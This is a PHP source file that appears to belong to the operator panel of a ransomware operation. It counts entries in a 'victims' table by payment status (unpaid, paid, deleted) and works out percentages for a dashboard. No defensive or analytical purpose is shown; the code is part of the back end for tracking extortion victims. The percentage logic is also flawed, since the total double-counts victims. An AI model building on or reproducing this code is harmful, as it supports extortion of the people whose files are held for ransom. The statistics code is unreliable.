<?php
session_start();
if(!defined('CMS')){
	define('CMS', true);
}
include "system/config.php";
include "system/class_notice.php";
include "system/class_pagination.php";
include "system/function.php";
if(!defined('ROOT')){
	define('ROOT', dirname(__FILE__)."/");
}
if(!defined('HTTP')){
	define('HTTP', $HTTP);
}
$_CONF['HTTP'] = HTTP;
$_CONF['ROOT'] = ROOT;
$notice = new notice;
$db->go("SELECT * FROM victims");
$victim = $db->numRows();
$db->go("SELECT * FROM victims WHERE status = 0");
$unpaid = $db->numRows();
$db->go("SELECT * FROM victims WHERE status = 1");
$payed = $db->numRows();
$db->go("SELECT * FROM victims WHERE status = 2");
$deleted = $db->numRows();
$total = $victim+$unpaid+$payed+$deleted;
$p_victim = (($victim==0) ? 0 : $victim/$total*100);
$p_unpaid = (($unpaid==0) ? 0 : $unpaid/$total*100);
$p_payed = (($payed==0) ? 0 : $payed/$total*100);
$p_deleted = (($deleted==0) ? 0 : $deleted/$total*100);
?>